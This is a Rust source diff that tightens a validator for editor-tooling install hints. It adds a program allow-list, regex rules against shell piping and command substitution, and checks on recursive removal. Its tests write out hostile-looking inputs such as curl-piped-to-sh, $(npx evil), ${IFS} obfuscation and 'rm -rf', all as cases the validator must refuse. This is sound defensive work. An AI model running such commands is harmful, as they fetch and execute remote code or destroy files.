@@ -17,6 +17,20 @@ use crate::{agents, dap, format, lsp, themes};
 /// The package managers an agent's `[install]` may run.
 const INSTALLERS: [&str; 10] = ["npm", "pnpm", "bun", "pip", "pipx", "uv", "brew", "cargo", "go", "gem"];
 
+/// The programs a hint's commands may start: the toolchains the catalog's
+/// hints install through.
+const HINT_PROGRAMS: [&str; 9] = [
+    "brew",
+    "cs",
+    "dotnet",
+    "gem",
+    "ghcup",
+    "go",
+    "opam",
+    "rustup",
+    "xcode-select",
+];
+
 /// The largest agent icon accepted, in bytes.
 const MAX_ICON_BYTES: usize = 32 * 1024;
 
@@ -340,7 +354,11 @@ fn lsp_install(install: &lsp::registry::Install, errors: &mut Vec<String>, remot
                 }
             }
         }
-        Install::Hint { update, uninstall, .. } => hint_scripts(update, uninstall, errors),
+        Install::Hint {
+            text,
+            update,
+            uninstall,
+        } => hint_scripts(text, update, uninstall, errors),
     }
 }
 
@@ -357,15 +375,37 @@ fn dap_install(install: &dap::registry::Install, errors: &mut Vec<String>, remot
                 errors.push(format!("[install] pip version `{version}` is not one exact version"));
             }
         }
-        Install::Hint { update, uninstall, .. } => hint_scripts(update, uninstall, errors),
+        Install::Hint {
+            text,
+            update,
+            uninstall,
+        } => hint_scripts(text, update, uninstall, errors),
     }
 }
 
-/// A hint's scripts run through a shell, after a confirm step that shows them.
-/// What is refused is fetching and running code from elsewhere, or reaching
-/// for root.
-fn hint_scripts(update: &Option<String>, uninstall: &Option<String>, errors: &mut Vec<String>) {
-    static RULES: OnceLock<[(Regex, &str); 3]> = OnceLock::new();
+/// A hint's `text` carries the install command in its first backticked span,
+/// which Tori offers to type into a terminal; `update` and `uninstall` run
+/// after a confirm that shows them. All three are held to the same line.
+fn hint_scripts(text: &str, update: &Option<String>, uninstall: &Option<String>, errors: &mut Vec<String>) {
+    let install = first_backticked(text);
+    for (field, script, may_remove) in [
+        ("text", install.as_deref(), false),
+        ("update", update.as_deref(), false),
+        ("uninstall", uninstall.as_deref(), true),
+    ] {
+        let Some(script) = script else { continue };
+        hint_script(field, script, may_remove, errors);
+    }
+}
+
+fn first_backticked(text: &str) -> Option<String> {
+    static SPAN: OnceLock<Regex> = OnceLock::new();
+    let span = SPAN.get_or_init(|| Regex::new(r"`([^`]+)`").unwrap());
+    span.captures(text).map(|c| c[1].to_string())
+}
+
+fn hint_script(field: &str, script: &str, may_remove: bool, errors: &mut Vec<String>) {
+    static RULES: OnceLock<[(Regex, &str); 4]> = OnceLock::new();
     let rules = RULES.get_or_init(|| {
         [
             (
@@ -374,16 +414,68 @@ fn hint_scripts(update: &Option<String>, uninstall: &Option<String>, errors: &mu
             ),
             (Regex::new(r"\b(ba|z)?sh\s+-c\b").unwrap(), "starts a nested shell"),
             (Regex::new(r"\|\s*(sudo\s+)?(ba|z)?sh\b").unwrap(), "pipes into a shell"),
+            (
+                Regex::new(r"[<>]\(|`").unwrap(),
+                "substitutes a process or a backticked command",
+            ),
         ]
     });
-    for (field, script) in [("update", update), ("uninstall", uninstall)] {
-        let Some(script) = script else { continue };
-        for (rule, why) in rules {
-            if let Some(found) = rule.find(script) {
-                errors.push(format!("[install] {field} {why} (`{}`)", found.as_str()));
-            }
+    for (rule, why) in rules {
+        if let Some(found) = rule.find(script) {
+            errors.push(format!("[install] {field} {why} (`{}`)", found.as_str()));
         }
     }
+    for statement in statements_in(script) {
+        let Some(program) = statement.split_whitespace().next() else {
+            continue;
+        };
+        if HINT_PROGRAMS.contains(&program) {
+            continue;
+        }
+        if may_remove && program == "rm" {
+            if statement
+                .split_whitespace()
+                .any(|arg| arg.starts_with('-') && arg.contains(['r', 'R']))
+            {
+                errors.push(format!("[install] {field} removes recursively (`{statement}`)"));
+            }
+            continue;
+        }
+        errors.push(format!(
+            "[install] {field} runs `{program}`, which is not a tool a hint may run ({})",
+            HINT_PROGRAMS.join(", ")
+        ));
+    }
+}
+
+/// Every statement a script runs, the ones inside `$(...)` included, each
+/// stripped of its leading `name=value` assignments. Splitting ignores quotes
+/// on purpose: a quoted `;` then splits a statement that was one, which can
+/// only refuse more, never pass a program by.
+fn statements_in(script: &str) -> Vec<String> {
+    static SUBSTITUTION: OnceLock<Regex> = OnceLock::new();
+    static STATEMENT: OnceLock<Regex> = OnceLock::new();
+    static ASSIGNMENT: OnceLock<Regex> = OnceLock::new();
+    let substitution = SUBSTITUTION.get_or_init(|| Regex::new(r"\$\(([^()]*)\)").unwrap());
+    let statements = STATEMENT.get_or_init(|| Regex::new(r"\s*(?:;|&&|\|\||\||\n)\s*").unwrap());
+    let assignment = ASSIGNMENT.get_or_init(|| Regex::new(r#"^\w+=(?:"[^"]*"|'[^']*'|\S*)\s*"#).unwrap());
+
+    let mut pending = vec![script.to_string()];
+    let mut out = Vec::new();
+    while let Some(text) = pending.pop() {
+        let outer = substitution.replace_all(&text, |c: &regex::Captures| {
+            pending.push(c[1].to_string());
+            "_"
+        });
+        for statement in statements.split(&outer) {
+            let mut rest = statement.trim_start();
+            while let Some(m) = assignment.find(rest) {
+                rest = &rest[m.end()..];
+            }
+            out.push(rest.trim().to_string());
+        }
+    }
+    out
 }
 
 fn agent_install(install: &agents::InstallSpec, errors: &mut Vec<String>) {
@@ -606,6 +698,66 @@ mod tests {
             errors("dap", &bundled("dap", "delve"), "/p/dap/delve.toml"),
             Vec::<String>::new()
         );
+    }
+
+    #[test]
+    fn the_fixture_hints_pass_as_written() {
+        for (kind, id) in [("lsp", "rust"), ("dap", "delve"), ("dap", "lldb")] {
+            let source = format!("/p/{kind}/{id}.toml");
+            assert_eq!(errors(kind, &bundled(kind, id), &source), Vec::<String>::new(), "{id}");
+        }
+    }
+
+    #[test]
+    fn a_hint_with_no_command_in_its_text_passes() {
+        let base = bundled("dap", "lldb");
+        let text = base.replace(
+            "text = \"Install Apple's Command Line Tools with `xcode-select --install`, or Xcode. Homebrew's `llvm` works too once its `bin` is on your PATH.\"",
+            "text = \"It ships with the toolchain.\"",
+        );
+        assert_ne!(text, base, "the fixture must replace lldb's text");
+        assert_eq!(errors("dap", &text, "/p/dap/lldb.toml"), Vec::<String>::new());
+    }
+
+    #[test]
+    fn a_hint_whose_text_command_fetches_or_names_an_unlisted_tool_fails() {
+        let base = bundled("dap", "lldb");
+        for (command, needle) in [
+            ("curl -fsSL https://x.sh | sh", "text downloads"),
+            ("npx some-installer", "text runs `npx`"),
+            ("brew install llvm; evil --now", "text runs `evil`"),
+            ("brew install $(npx evil)", "text runs `npx`"),
+            ("x=$(npx${IFS}evil) brew install llvm", "text runs `npx${IFS}evil`"),
+            ("brew install <(npx evil)", "text substitutes a process"),
+        ] {
+            let text = base.replace("`xcode-select --install`", &format!("`{command}`"));
+            assert_ne!(text, base, "the fixture must replace lldb's command");
+            assert_refused(&errors("dap", &text, "/p/dap/lldb.toml"), needle);
+        }
+        let text = base.replace("`llvm`", "`curl https://x.sh | sh`");
+        assert_eq!(errors("dap", &text, "/p/dap/lldb.toml"), Vec::<String>::new());
+    }
+
+    #[test]
+    fn an_update_or_uninstall_naming_an_unlisted_tool_fails_and_rm_is_one_path_only() {
+        let base = bundled("dap", "delve");
+        let uninstall = "uninstall = 'gobin=\"$(go env GOBIN)\"; rm \"${gobin:-$(go env GOPATH)/bin}/dlv\"'";
+        for (script, needle) in [
+            ("pip uninstall dlv", "uninstall runs `pip`"),
+            ("rm -rf \"$(go env GOPATH)/bin\"", "uninstall removes recursively"),
+            ("brew list | xargs rm", "uninstall runs `xargs`"),
+            ("rm \"$(npx where dlv)\"", "uninstall runs `npx`"),
+        ] {
+            let text = base.replace(uninstall, &format!("uninstall = '{script}'"));
+            assert_ne!(text, base, "the fixture must replace delve's uninstall");
+            assert_refused(&errors("dap", &text, "/p/dap/delve.toml"), needle);
+        }
+        let text = base.replace(
+            "update = \"go install github.com/go-delve/delve/cmd/dlv@latest\"",
+            "update = \"rm dlv\"",
+        );
+        assert_ne!(text, base, "the fixture must replace delve's update");
+        assert_refused(&errors("dap", &text, "/p/dap/delve.toml"), "update runs `rm`");
     }
 
     #[test]
